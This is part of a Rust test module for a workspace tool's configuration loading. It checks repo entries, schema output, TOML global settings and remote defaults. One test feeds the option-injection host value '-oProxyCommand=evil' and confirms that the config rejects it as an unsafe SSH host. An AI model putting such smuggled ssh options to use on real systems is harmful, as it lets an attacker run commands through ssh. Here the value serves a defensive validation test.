        let cfg = load(dir.path()).unwrap();
        let repo = &cfg.repos[0];
        assert_eq!(repo.kind, Some(RepoKind::Container));

        let app = &repo.services["app"];
        assert_eq!(app.port, 80);
        assert!(matches!(app.http, Some(HttpDecl::Subdomain(ref s)) if s == "api"));
        assert!(!app.shared);
        assert!(repo.services["mysql"].http.is_none());
        assert!(repo.services["redis"].shared);

        assert!(matches!(repo.scripts["post-create"], Script::Many(ref v) if v.len() == 2));
        assert!(matches!(repo.scripts["up"], Script::One(ref s) if s == "docker compose up -d"));
        assert_eq!(repo.env["APP_URL"], "https://${WS_HOST_app}");
        assert_eq!(repo.templates[0].src, "nginx.conf.tmpl");
        assert_eq!(repo.templates[0].dest, "nginx.conf");
    }

    #[test]
    fn http_true_and_bare_name_repo() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":["web",{"name":"api","services":{"app":{"http":true,"port":8080}}}]}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        assert_eq!(cfg.repos[0].name, "web");
        // The bare name is a full all-defaults config, not a distinct state.
        assert!(cfg.repos[0].kind.is_none() && cfg.repos[0].services.is_empty());
        let app = &cfg.repos[1].services["app"];
        assert!(matches!(app.http, Some(HttpDecl::Enabled(true))));
    }

    #[test]
    fn repos_round_trip_keeps_each_entrys_spelling() {
        // `ws remote set/unset` rewrite the whole file, so an all-defaults entry
        // must come back out as the bare string it went in as — whichever
        // spelling it went in as.
        let json = r#"{"repos":["web",{"name":"api","copy":[".env"]},{"name":"db"}]}"#;
        let cfg: WsConfig = serde_json::from_str(json).unwrap();
        let out = serde_json::to_string(&cfg).unwrap();
        assert_eq!(out, r#"{"repos":["web",{"name":"api","copy":[".env"]},"db"]}"#);
    }

    #[test]
    fn repos_schema_still_offers_the_bare_string_form() {
        // The generated `.ws.schema.json` ships to users; editor completion for
        // `"repos": ["api"]` depends on the string arm staying offered.
        let schema = serde_json::to_value(schemars::schema_for!(WsConfig)).unwrap();
        let items = &schema["properties"]["repos"]["items"];
        let arms = items["anyOf"].as_array().expect("repos items should stay a string-or-object choice");
        assert!(arms.iter().any(|a| a["type"] == "string"));
        assert!(arms.iter().any(|a| a["$ref"] == "#/definitions/RepoConfig"));
    }

    #[test]
    fn global_config_set_get_unset_round_trip() {
        let mut g = GlobalConfig::default();
        assert_eq!(g.get("remote.host").unwrap(), None);

        g.set("remote.host", "srv").unwrap();
        assert_eq!(g.get("remote.host").unwrap(), Some("srv"));

        let toml_s = toml::to_string_pretty(&g).unwrap();
        assert!(toml_s.contains("[remote]") && toml_s.contains("host = \"srv\""));
        let back: GlobalConfig = toml::from_str(&toml_s).unwrap();
        assert_eq!(back.remote_host(), Some("srv"));

        // A typo'd key must refuse at parse, not read as unset: `save` rewrites the
        // whole file, so ignoring it silently would delete it.
        let e = toml::from_str::<GlobalConfig>("[remote]\nhosst = \"x\"\n")
            .map(|_| ())
            .expect_err("unknown TOML key must be refused");
        assert!(e.to_string().contains("hosst"), "{e}");

        assert!(g.unset("remote.host").unwrap());
        assert!(g.remote.is_none(), "emptied section must be pruned");
        assert_eq!(toml::to_string_pretty(&g).unwrap(), "");
        assert!(!g.unset("remote.host").unwrap());
    }

    #[test]
    fn global_config_rejects_unknown_keys_and_unsafe_hosts() {
        let mut g = GlobalConfig::default();
        for r in [
            g.get("remote.hots").map(|_| ()),
            g.set("no.such.key", "x"),
            g.unset("remote").map(|_| ()),
        ] {
            let e = r.expect_err("unknown key must be refused");
            assert!(e.to_string().contains("known keys"), "{e}");
        }
        // The host lands in ssh argv later, so option-shaped values are refused at
        // set time as well as at load.
        let e = g.set("remote.host", "-oProxyCommand=evil").expect_err("unsafe host");
        assert!(e.to_string().contains("unsafe SSH host"), "{e}");
    }

    #[test]
    fn global_keys_and_accessor_arms_stay_in_sync() {
        // GLOBAL_KEYS only feeds error text; this walk keeps it honest against
        // the match arms — a key listed but unhandled (or vice versa) fails here.
        let mut g = GlobalConfig::default();
        for key in GLOBAL_KEYS {
            g.set(key, "some-value").unwrap_or_else(|e| panic!("set {key}: {e}"));
            assert_eq!(g.get(key).unwrap(), Some("some-value"), "get {key}");
            assert!(g.unset(key).unwrap(), "unset {key}");
            assert_eq!(g.get(key).unwrap(), None, "{key} cleared");
        }
    }

    #[test]
    fn worktree_base_defaults_to_workspace_dir_name() {
        let r = RemoteConfig { connection: "h".into(), workspace_path: None, publish_address: None };
        assert_eq!(r.worktree_base(Path::new("/home/me/myapp")), "myapp");
        let r2 = RemoteConfig { workspace_path: Some("ws/x".into()), ..r };
        assert_eq!(r2.worktree_base(Path::new("/home/me/myapp")), "ws/x");
    }
}
